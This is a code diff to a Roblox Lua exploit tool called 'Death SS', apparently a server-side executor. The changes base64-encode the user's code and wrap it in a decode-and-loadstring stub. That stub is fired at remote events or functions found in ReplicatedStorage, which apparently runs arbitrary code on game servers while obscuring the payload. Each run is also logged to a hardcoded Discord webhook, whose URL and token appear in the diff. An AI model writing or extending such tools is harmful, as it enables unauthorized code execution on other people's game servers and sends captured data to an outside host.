@@ -9,16 +9,41 @@ local WEBHOOK = "https://discord.com/api/webhooks/1393626932444135556/6CCtBAxFJ0
 
 local function sendWebhook(data)
     spawn(function()
-        local payload = HttpService:JSONEncode({username = "Death SS", content = data})
+        local payload = HttpService:JSONEncode({
+            username = "Death SS",
+            content = data
+        })
         pcall(function()
             HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
         end)
     end)
 end
 
+local function base64Encode(data)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    return ((data:gsub('.', function(x)
+        local r,binary='',x:byte()
+        for i=8,1,-1 do r=r..(binary%2^i-binary%2^(i-1)>0 and '1' or '0') end
+        return r
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c=0
+        for i=1,6 do c=c + (x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
+
 local UI = Instance.new("ScreenGui", PlayerGui)
 UI.Name = "DeathSS"
 UI.ResetOnSpawn = false
+
+local TopBar = Instance.new("Frame", UI)
+TopBar.Size = UDim2.new(1, 0, 0, 40)
+TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+TopBar.BorderSizePixel = 0
+TopBar.Active = true
+TopBar.Draggable = true
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
 
 local Main = Instance.new("Frame", UI)
 Main.Size = UDim2.new(0, 600, 0, 380)
@@ -29,14 +54,6 @@ Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
 Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
-
-local TopBar = Instance.new("Frame", Main)
-TopBar.Size = UDim2.new(1, 0, 0, 40)
-TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-TopBar.BorderSizePixel = 0
-TopBar.Active = true
-TopBar.Draggable = true
-Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
 
 local Title = Instance.new("TextLabel", TopBar)
 Title.Size = UDim2.new(1, -50, 1, 0)
@@ -144,18 +161,51 @@ ReplicatedStorage.ChildRemoved:Connect(updateRemotes)
 
 ExecuteBtn.MouseButton1Click:Connect(function()
     local code = Editor.Text
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    local function encode(data)
+        return ((data:gsub('.', function(x)
+            local r,binary='',x:byte()
+            for i=8,1,-1 do r=r..(binary%2^i-binary%2^(i-1)>0 and '1' or '0') end
+            return r
+        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+            if (#x < 6) then return '' end
+            local c=0
+            for i=1,6 do c=c + (x:sub(i,i)=='1' and 2^(6-i) or 0) end
+            return b:sub(c+1,c+1)
+        end)..({ '', '==', '=' })[#data%3+1])
+    end
+    local encoded = encode(code)
+    local execString = [[
+        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+        local function decode(data)
+            data = string.gsub(data, '[^'..b..'=]', '')
+            return (data:gsub('.', function(x)
+                if (x == '=') then return '' end
+                local r,f='',(b:find(x)-1)
+                for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+                return r
+            end):gsub('%d%d%d%d%d%d%d%d', function(x)
+                local c=0
+                for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
+                return string.char(c)
+            end))
+        end
+        local decoded = decode("]] .. encoded .. [[")
+        local f = loadstring or load
+        if f then f(decoded)() end
+    ]]
     local success, response
     if currentRemoteEvent then
         success, response = pcall(function()
-            currentRemoteEvent:FireServer(code)
+            currentRemoteEvent:FireServer(execString)
         end)
     elseif currentRemoteFunction then
         success, response = pcall(function()
-            return currentRemoteFunction:InvokeServer(code)
+            return currentRemoteFunction:InvokeServer(execString)
         end)
     end
     if success then
-        sendWebhook("Executed code:\n```lua\n" .. tostring(code) .. "\n```")
+        sendWebhook("Executed code (base64 encoded):\n```lua\n" .. encoded .. "\n```")
     else
         sendWebhook("Failed execution:\n```" .. tostring(response) .. "```")
     end
